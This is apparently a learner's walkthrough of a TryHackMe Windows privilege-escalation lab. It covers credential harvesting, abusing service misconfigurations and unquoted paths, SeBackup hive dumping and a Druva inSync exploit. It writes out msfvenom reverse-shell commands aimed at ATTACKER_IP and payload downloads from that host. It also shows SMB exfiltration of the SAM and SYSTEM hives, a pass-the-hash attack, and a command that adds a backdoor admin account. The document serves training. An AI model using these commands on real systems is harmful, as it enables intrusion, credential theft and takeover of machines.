# Task 1 - Introduction
Often during a penetration test, we will have access to some Windows hosts, but as an unprivileged user with limited access permissions, mainly to their files and folders only. As such, the user would have no ability to perform administrative tasks.

This room covers fundamental techniques that penetration testers (or attackers) can use to elevate privileges in a Windows environment, giving us the ability to use an unprivileged foothold on a host to escalate to an administrator account.

Q1: N/A

### Let's GO!

* * *

# Task 2 - Windows Privilege Escalation Overview

As we have learned, privilege escalation entails leveraging any access to a host with "User A" to gain access to "User B" through any weaknesses in the target system. Ideally, "User B" would have administrative rights, but in some situations we would need to escalate into other unprivileged accounts to find a way to escalate, as we saw in the Linux PrivEsc room.

Depending on the situation, we can first focus on some of the following weaknesses:

- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

Windows systems primarily have two types of users based on their access levels: 

- Administrators - Have the most privileges. Can change any system config paramater and access any file in the system.
- Standard Users - Can access the computer but perform limited tasks related to their role. But typically these users can't make changes to the system, aside from certain personalization and other abilities that are in-line with the company's policy.

In addition, certain built-in accounts are typically used by the operating system in the context of privilege escalation:

- SYSTEM / LocalSystem - An account used by the OS to perform internal tasks.
- Local Service - A default account that runs Windows services with "minimum" privileges and anonymous connections over the network.
- Network Service - A default account used to run Windows services with "minimum" privileges, but unlike "local" this account will use credentials to authenticate through the network.

The three accounts above are created and managed by Windows, unlike other regular accounts. That said, depending on the situation, it is possible to gain these privileges by exploiting specific services.

Q1: Users that can change system configurations are part of which group? 

Q2: The SYSTEM account has more privileges than the Administrator user (aye/nay)

* * *
# Task 3 - Harvesting Passwords From Usual Spots

The easiest way to gain access to another user is to harvest credentials from a compromised machine. It's possible that such credentials were left by a careless user in plaintext files, stored in software, such as browsers or email clients, as well as other possibilities.

In this task we explore some known places to search for passwords on a **Windows** system.

Starting the machine will open the split-screen view. If using the AttackBox or a VM, use Remmina (or other tool of your choice to connect via RDP using the following credentials:

User: thm-unpriv
Password: Password321

* * *
### Part One - Unattended Windows Installations
* * *

### Part Two - PowerShell History
* * *
### Part Three - Saved Windows Credentials
* * *
### Part Four - IIS Configuration
* * *
### Part Five - Credentials in Software (using PuTTY)
* * * 

Q1: A password for the julia.jones user has been left on the Powershell history. What is the password?

Q2: A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?

Q3: There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.

Q4: Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?

* * *

# Task 4 - Other Quick Wins

Occasionally, it may be relatively easy to locate credentials of users with higher privileges using service misconfigurations, and in some cases even admin credentials. It is definitely worth exploring some of the following methods.

### Part One - Scheduled Tasks

* * *

### Part Two - AlwaysInstallElevated (Note: This technique apparently does not work in the room, but I will attempt to walk through it)


* * *

# Task 5 - Abusing Service Misconfigurations

_Note: This is a long task, so I'm dividing it into Part One through Four to keep things organized and more readable._

### Part One - Overview:

#### Windows Services

Windows services are managed by the **Service Control Manager** (SCM). The SCM is a process that manages the state of services as needed, checking status of any given service, and provides a way to configure services.

Each service on a Windows machine will have an associated executable, run by the SCM when said service is started. Service executables implement special functions to communicate with the SCM, thus not all executables may be started as a service. Each service also specifies the user account under which it will run.

#### 5.1.1

To demonstrate - open a command prompt on the machine (from task 3) and we will check the apphostsvc service configuration with the `sc qc` command:

![Pasted image 20231103112215](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/9077c26b-e765-4ecb-a49b-33b9b443ddf2)

Here we see the associated executable is specified according to the **BINARY_PATH_NAME** parameter and the account is shown as the **SERVICE_START_NAME** parameter.


On the Windows Target Machine, open ProcessHacker (located on the Desktop).  Go to the Services tab and find AppHostSvc, right click on Properties.

In the security tab, we see a Discretionary Access Control List (DACL), showing account permissions to start, stop, pause, query status, query configuration, or reconfigure the service, as well as other privileges:

![Pasted image 20231103112824](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/ac77fa0d-9614-4b79-b8d7-c868c771b715)

Going to `C:\Windows` we can open regedit and navigate to: `HKLM\SYSTEM\CurrentControlSet\Services\` where we find all of the Services configurations are stored on the registry:

![Pasted image 20231103114045](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/94d5dbb3-bf07-402f-94b1-9664f76b4ff1)

For every service in the system a subkey exists. We see the associated executable as the **ImagePath** value and the account used to start the service as the **ObjectName** value. If a DACL is configured for the service, it will be stored in a **Security** subkey. As such, by default, only administrators can modify such registry entries.
* * *
### Part Two - Insecure Permissions on Service Executable:

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

#### 5.2.1

To understand how this works, let's look at a Privilege Escalation vulnerability found on [exploit-db](https://www.exploit-db.com/exploits/45072) for Splinterware System Scheduler. To start, we will query the service configuration using `sc`:

![Pasted image 20231103114453](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/df67b8fb-43c5-4704-a40f-8f19b354ad16)

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:

![Pasted image 20231103114920](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/ff720af5-66b0-41cb-ba14-94f26e5f3b5f)

Interesting! The Everyone group has modify (M) permissions on the service's executable. We can choose an appropriate payload to overwrite the executable, then the service will execute it with the privileges of the configured user account.

#### 5.2.2

We can use msfvenom to generate an exe-service payload and serve it through a python simple http webserver. I am using AttackBox, but the LHOST is set to your attacking machine IP, with the LPORT as 4445 or any port of your choice except 8000.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`

![Pasted image 20231103115852](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/67e396fc-c31e-4295-88f6-961f359ddf73)

And we will create the server using:

`python3 -m http.server`

(I tend to open a new tab for this)

This allows us to pull the payload from the Windows (target) machine using the following: 

`wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe`

![Pasted image 20231103120956](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/60aeaa4d-d326-4639-bde1-f80fc4ab157a)

#### 5.2.3

Now that the payload is in the Windows server, we can replace the service executable with our payload. To do this we will need another user, and so we want to grant full permissions to the Everyone group. 

Back to the command prompt to cd into the directory of the service installed above:

![Pasted image 20231103122930](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/480d1082-a6c2-4fb1-a341-532a3ba2096f)

And on the attacking machine we start a netcat listener on port 4445 from the payload:

![Pasted image 20231103123157](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/934ee1ca-7a15-4f1d-bd28-a59d659d6580)

#### 5.2.4

Now, we can restart the service. Note that in a real-world situation, the service would take some time to restart. In this case we've been assigned privileges to restart the service manually. 

We can cd back to the regular user C:\ directory in the Windows command prompt, and use the following command:

    C:\> sc stop windowsscheduler 
    C:\> sc start windowsscheduler

#### 5.2.5

Check the netcat listener on the attacker machine...AND WE'RE IN! 

![Pasted image 20231103124238](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/a8f8c965-00aa-4717-8e97-b9417cfdf94f)

Now we can navigate to svcusr1 desktop to grab the flag, and make sure to answer Q1

![Pasted image 20231103125222](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/10f35f11-88cb-4f1d-9d6e-4b375563e93d)
* * *

### Part Three - Unquoted Service Paths

Windows' handling of service paths creates a possible vulnerability, whereby any path not wrapped with quotes (" ") within the service configuration leaves the service open to manipulation. Yes, an attacker could place an executable somewhere in the path, hijack the service and execute the code as the user running the service.

As an example we have two different services, with the first using proper quotation wrapping in the BINARY_PATH_NAME:

![Pasted image 20231103154525](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/5155d8eb-9bfa-458f-a6fd-297c4f5fc55a)

And the second lacking proper quotation wrapping:

![Pasted image 20231103154116](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/d7c982fb-5d89-49eb-b976-d620df3682cd)

When Windows tries to start the unquoted service, it will take the following paths in order and append ".exe" at the end of each space until it finds a service executable it can start. In the second example above, "disk sorter enterprise", the system would interpret the path as:

`C:\MyPrograms\Disk`.exe

`C:\MyPrograms\Disk Sorter`.exe

`C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`

If an attacker is able to somehow find a proper executable to place anywhere in the path, it could force the service to run an arbitrary executable.

As we saw in the introduction, most service executables are not writable by unprivileged users. That said, there are services configured with weak permissions by default, some that are misconfigured or changed by installers, and/or stored improperly.

#### 5.3.1

In our walkthrough, we assume the Administrator installed the Disk Sorter binaries under `C:\MyPrograms`. By default this inherits the permissions of the `C:\` directory, which allows any user to create files and folders within. We can first check this using `icacls`:

![Pasted image 20231103133306](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/e8af2fa9-46b2-4be2-b310-bd5de949bf8c)

The `BUILTIN\\Users` group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.

We will use the same process as in Part Two to create an exe-service payload with msfvenom and transfer it to the target host. 

#### 5.3.2

Create the following payload and to serve into the Windows machine using the python server. I made slight adjustments to rename LPORT=4446 and change the file name to rev-svc2.exe.

![Pasted image 20231103134359](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/529a0a17-7838-4769-ad70-e62ba557e146)

Again, use PowerShell to grab the payload from the attacker IP:

![Pasted image 20231103135304](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/aecf108e-d8aa-49f0-85e8-c63b57e574fe)

We will also start a listener to receive the reverse shell when it gets executed:

![Pasted image 20231103134603](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/b2f04fa3-8305-4c40-a535-bb6d6edc0d0a)

#### 5.3.3

Once the payload is on the Windows machine, we will move it to a location where hijacking might occur, in our case `C:\MyPrograms\Disk.exe`, and also give full permissions to Everyone:

![Pasted image 20231103135711](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/c8020972-91e5-421b-afae-2844d3812e88)

As we did earlier, we will stop and start the "disk sorter enterprise" service in the command prompt:

![Pasted image 20231103140254](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/e8915edc-1a91-4a7c-8484-28c4a8bbca5b)

#### 5.3.4

Back to our listener, and we have our shell with svcusr2 privileges:

![Pasted image 20231103140547](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/5ae72d35-bb70-4d00-8105-90a84e9cbb8e)

Now we can find the flag and answer Q2!

![Pasted image 20231103140957](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/e4369da4-322f-4b68-98b4-2154c30abebd)

Unfortunately, we can't just move into the Admin folder, so more escalation!
* * *
### Part Four - Insecure Service Permissions

Even if the executable DACL is well-configured and service properly quoted, it may still be possible to abuse a service. Here we would want to find out if the service DACL (not the service's executable DACL) allows us to modify and/or reconfigure the service itself.

This would enable us to run any executable, with any account, including SYSTEM.

#### 5.3.1

From the command line of the Windows machine, we can use [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite.

Here we see that the `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure this service.

![Pasted image 20231103142938](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/db524a85-a14e-43c5-a32c-931dc1d1bc2f)

#### 5.3.2

As we've done previously, we'll build an exe-service reverse shell on the Attacking Machine, again changing the LPORT to 4447 and the payload to rev-svc3.exe:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe`

Start the python server, and create a netcat listener on the Attacking Machine:

![Pasted image 20231103144212](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/c6e3b742-089e-4ace-9bc8-45869686c7e2)

![Pasted image 20231103144123](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/9df0a611-7e91-4a0e-be61-b74726004382)

#### 5.3.3

Again, use PowerShell to grab the payload, and this time we can keep it in the `C:\Users\thm-unpriv\` location.

![Pasted image 20231103145623](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/457b5f73-22aa-4c97-bb1d-21715e645ca2)

Grant permissions to Everyone in order to execute the payload:

![Pasted image 20231103145359](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/5ef1df3b-59d3-41e3-93b7-d36e7d17b3d5)

Now, to change the service's executable and account, use the following command:

![Pasted image 20231103150424](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/f9adb45c-f327-44b9-8b73-4fb834252abd)

Note above, that the command to start the service returned an error "the service has not been started". I started the service and returned to the listener on the AttackBox and received the shell with SYSTEM privileges:

![Pasted image 20231103150249](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/e66fcf5e-9834-47ed-97c4-db0c7d20c863)

Now we have our flag and can answer Q3!

![Pasted image 20231103150926](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/1849cbe0-3ada-4e65-8df1-e0d523b2c32b)

On to the next one...
* * *

# Task 6

### Part One - Windows Privileges
Each user has a set of rights, or privileges, assigned in connection with the specific system-related tasks performed in their role.

The assigned privileges can be checked with the following command (in Windows):
`whoami /priv`

More information and a complete list of available privileges on Windows systems can be found at [Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). An attacker would primarily be interested in the privileges that allow escalation. Another resource noted is the [Priv2Admin](https://github.com/gtworek/Priv2Admin) github project.
* * *

### Part Two - SeBackup / SeRestore
These privileges allow users to read and write to any file in the system, ignoring any DACL (Discretionary Access Control List) in place. This is for the purpose of performing backups from a system without requiring full admin privileges.

With this, an attacker could escalate privileges in various ways. For the purpose of this task, we will be looking at the [SeBackupPrivilege](https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md) technique, which involves copying the SAM and SYSTEM registry hives to extract the local Admin's password hash.

#### 6.2.1

No separate Windows machine here, so we will login using RDP using the following credentials:

User: THMBackup

Pass: CopyMaster555

I used Remmina RDC via the AttackBox, it's an Application included in Kali, not (afaik) a CLI tool. 

![Pasted image 20231104134407](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/29170488-42e6-430f-b163-4a92f11cdb7e)

Note: When Remmina opened I immediately got a pop-up asking for a key, I just hit cancel and entered the TARGET_IP.

It then took me to the login window where I entered the above credentials - no domain entered.

This is what the desktop looks like once logged in:

![Pasted image 20231104134840](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/3c282e8b-5b9a-4775-b01f-2247686e6697)


#### 6.2.2

Our account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. 

As such, we can open a command prompt "as administrator" then input our password again to get an elevated console:

![Pasted image 20231104141224](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/b0ede983-145b-401b-b119-1ec90ec98698)

Now we want to back up the SAM and SYSTEM hashes, using the following commands:

![Pasted image 20231104141557](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/bd74c4d6-6ec2-4965-8697-3c3befcfe348)

This creates two files with the registry hives content. 

#### 6.2.3

Next we need to copy the files to the attacker machine. Quite easy to do from Linux to Windows, not so much from Windows to Linux. Nevertheless, we'll give it a go using  [impacket's smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py). 

In the terminal on AttackBox, make a new directory, let's call it "share": 

`mkdir share`

Still in the AttackBox, start the SMB server with a network share in the current directory of the AttackBox using the following code with our Windows credentials:

`python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share`

![Pasted image 20231104143616](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/2bbdcecd-1a8b-4783-ab05-c17c01176b33)

Again, this creates a share named "public" pointing to the "share" directory we created on the AttackBox. The server will listen for our command coming from the Windows machine. 

#### 6.2.4

Now, we can return to the Windows machine, and using `copy` we will transfer both files to the share on the AttackBox:

![Pasted image 20231104144856](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/3131d728-a4e3-4089-9651-3fb4209a378f)

_It's fun to watch the transfer happen on both machines at the same time :)._

![Pasted image 20231104144801](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/8e7a8bb5-60b2-4e31-ac03-41cf45428987)

Aaaaand we can see that our files were successfully copied to the AttackBox!

![Pasted image 20231104145127](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/7844fa67-f9d9-4c00-8016-36a3a6e69cf2)

#### 6.2.5

Still on the AttackBox, using [impacket's secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), we can retrieve the users' password hashes. 

***Note: Make sure to run this from within the share directory where the files are located***:

![Pasted image 20231104150130](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/325ea07d-7f89-4a44-aaa0-065872bce48f)

#### 6.2.6

Again, with the Administrator's hash, we can use [impacket psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py), a very useful python script for penetrating Windows. Using this script, we will perform a [Pass-the-Hash](https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/) attack and gain access to the target with SYSTEM privileges.

Now we can navigate to the Administrator's desktop and grab our flag!

![Pasted image 20231104151315](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/d53ef57c-269a-4b90-91dc-e51048a6de4d)


***Note: This task goes through three methods of privilege escalation by abusing "Dangerous Privileges". I am only including the first method as of today, but at some point will probably return to walk through the other two. I learned a TON!***

Also, I just want to point out that while these are very well done walk-through rooms, in a few cases I pulled errors, which forced me to either look at my code (typos, etc.), look something up to see if it still worked, or just find the source of info and READ. All that is to say, this process of learning is incredible. And while I don't always grasp EVERYTHING right away, by doing the tasks I'm not just learning a concept, I'm learning _how to learn_ these processes and techniques. Also, I'm learning how to learn more, and it just keeps going.

* * *

# Task 7 - Abusing Vulnerable Software

***We Made it!***

### Part One - Unpatched Software

Numerous privilege escalation opportunities arise through unpatched, misconfigured, or other vulnerable software.

#### 7.1.1
To view the software installed on the target system, we can use the following command:

`wmic product get name,version,vendor`

After a few minutes we see the following information:

![Pasted image 20231105093926](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/c35ae270-713c-4944-b122-5682036bf02c)

As seen above, the `wmic product` command will not return all installed programs. It's always a good idea to enumerate as much as possible.

Once we see product and version info, we can check sites such as [exploit-db](https://www.exploit-db.com/) for existing exploits on the programs found. 

* * *

### Part Two - Case Study

For this task, we will be using the Druva inSync 6.6.3 program, for which a known vulnerability exists. [CVE-2020-5752](https://www.exploit-db.com/exploits/48505) was initially reported in 2020 by Matteo Malvica, but was based on a patched exploit found in the previous version of the software. According to his excellent [Writeup](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/), the patch introduced an additional bug, essentially allowing a low-privileged user to obtain SYSTEM level privileges. 

The vulnerability discovered in the patched version is a bit complex. That said, I am reading through the details in order to understand what's happening. 

It's important to note that the second vulnerability was discovered in the process of the author's verification of the vendor's patch, and how it was implemented. In doing so, they discovered an unexpected new vulnerability.

#### 7.2.1

On to our task. If you are using the Target Windows machine in the task, the exploit is located in a text file at:

`C:\tools\Druva_inSync_exploit.txt`

By default, the exploit creates a new user named "pwnd", as specified in the `$cmd` variable, but this user is not assigned Admin privileges. For our purposes we will edit the exploit such that "pwnd" is also added to the Administrators' group, using the following:

    `$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"`

After making the edits, the exploit can be pasted directly into a PowerShell console. Hit enter and let's see if it worked!

![Pasted image 20231105102454](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/2cface19-3609-4197-830e-7db2880167bc)

Using the following in a command prompt: 

    `net usr pwnd` 
    
we verify that the user `pwnd` was added with a password of `SimplePass123` and is part of the administrators' group 

![Pasted image 20231105102232](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/78e64579-6261-4e4f-9f84-ea99debbaec8)

#### 7.2.2

Ok, good to go! Now we can run a command prompt as administrator, using the pwnd account:

![Pasted image 20231105104521](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/2907adce-39d1-479f-98b0-10f452862bb4)

Well, I don't know if I missed something, but I had to click on "More choices", point to the User pwnd, and the password was not accepted. Finally I just left the password field blank, hit enter, and got the admin prompt:

![Pasted image 20231105110032](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/c979ff94-6521-4e24-ac68-1e88e7646fb9)

![Pasted image 20231105105840](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/39c851c8-7c0e-4470-a376-4805d8aadd50)

Now we can navigate to the Admin's desktop and grab that flag!

![Pasted image 20231105110328](https://github.com/ne1atonin/TryHackMe-WriteUps/assets/135453212/5a6fba11-d176-4911-b2ba-c5a8ef9dfa8d)


And with that, we have completed the room as well as the Jr Penetration Tester Path!

> Note: While I completed the path, I did not start these writeups initially, so I am gradually going back through the previous rooms to complete the writeups and will continue to update.
